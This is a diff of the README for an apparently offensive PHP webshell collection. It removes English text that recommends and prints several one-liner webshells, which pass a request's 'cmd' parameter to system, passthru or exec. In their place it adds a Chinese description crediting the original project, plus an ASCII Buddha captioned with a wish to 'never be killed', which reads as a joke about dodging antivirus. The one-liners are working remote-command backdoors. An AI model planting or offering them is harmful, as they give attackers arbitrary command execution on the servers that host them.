@@ -1,31 +1,31 @@
-Contributing
-============
-To contribute other shells not listed here... Fork, Push the changes to your repo, then before you request for a Pull, make sure to include a simple description of your **php** web-shell and include a screen-shot of the web-shell (as hosted in your localhost).
+另外的一个php webshell 收集项目~
 
+hihi
 
+Author：JohnTroony
 
+site: [JohnTroony/php-webshells](https://github.com/JohnTroony/php-webshells)
 
-php-webshells
-=============
-
-Common php webshells. Do not host the file(s) in your server!
-
-++++++++++++++++++++++++++
-
-Though I recommend one-liners like 
-
-<?php echo passthru($_GET['cmd']); ?>
-
-(Not a full fledged webshell, but works fine)
-
-=================================================================
-
-You can try WebHandler for one-liners.
-
-WebHandler.py works for POST and GET requests:
-
-    <?php system($_GET['cmd']); ?>
-    <?php passthru($_REQUEST['cmd']); ?>
-    <?php echo exec($_POST['cmd']); ?>
-
-
+<pre>
+                                  _oo0oo_
+                                 088888880
+                                 88" . "88
+                                 (| -_- |)
+                                  0\ = /0
+                               ___/'---'\___
+                             .' \\|     |// '.
+                            / \\|||  :  |||// \
+                           /_ ||||| -:- |||||- \
+                          |   | \\\  -  /// |   |
+                          | \_|  ''\---/''  |_/ |
+                          \  .-\__  '-'  __/-.  /
+                        ___'. .'  /--.--\  '. .'___
+                     ."" '<  '.___\_<|>_/___.' >'  "".
+                    | | : '-  \'.;'\ _ /';.'/ - ' : | |
+                    \  \ '_.   \_ __\ /__ _/   .-' /  /
+                ====='-.____'.___ \_____/___.-'____.-'=====
+                                  '=---='
+ 
+              ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+                        佛祖保佑    iii    永不被杀 
+</pre>
